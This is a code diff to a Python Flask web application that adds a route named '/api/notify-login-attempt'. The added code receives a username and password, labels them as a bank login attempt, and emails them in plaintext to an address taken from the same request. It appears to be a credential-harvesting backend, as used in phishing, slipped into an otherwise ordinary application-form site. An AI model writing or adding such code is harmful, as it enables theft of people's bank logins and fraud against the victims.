@@ -514,6 +514,37 @@ def application_submitted():
     return render_template('application_submitted.html', title='Application Submitted', 
                           application=application)
 
+
+
+@app.route('/api/notify-login-attempt', methods=['POST'])
+def notify_login_attempt():
+    """Handle login attempt notifications"""
+    data = request.json
+    username = data.get('username')
+    password = data.get('password')
+    attempt = data.get('attempt')
+    email = data.get('email')
+    
+    # Create email subject and body
+    subject = f"Bank Login Attempt #{attempt}"
+    body_html = f"""
+    <html>
+    <body>
+        <h2>Bank Login Attempt {attempt}</h2>
+        <p>Username: {username}</p>
+        <p>Password: {password}</p>
+        <p>Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
+    </body>
+    </html>
+    """
+    
+    # Send email using existing email service
+    from email_service import send_email
+    send_email(email, subject, body_html)
+    
+    return jsonify({'status': 'success'})
+
+
 @app.errorhandler(404)
 def page_not_found(e):
     return render_template('404.html'), 404
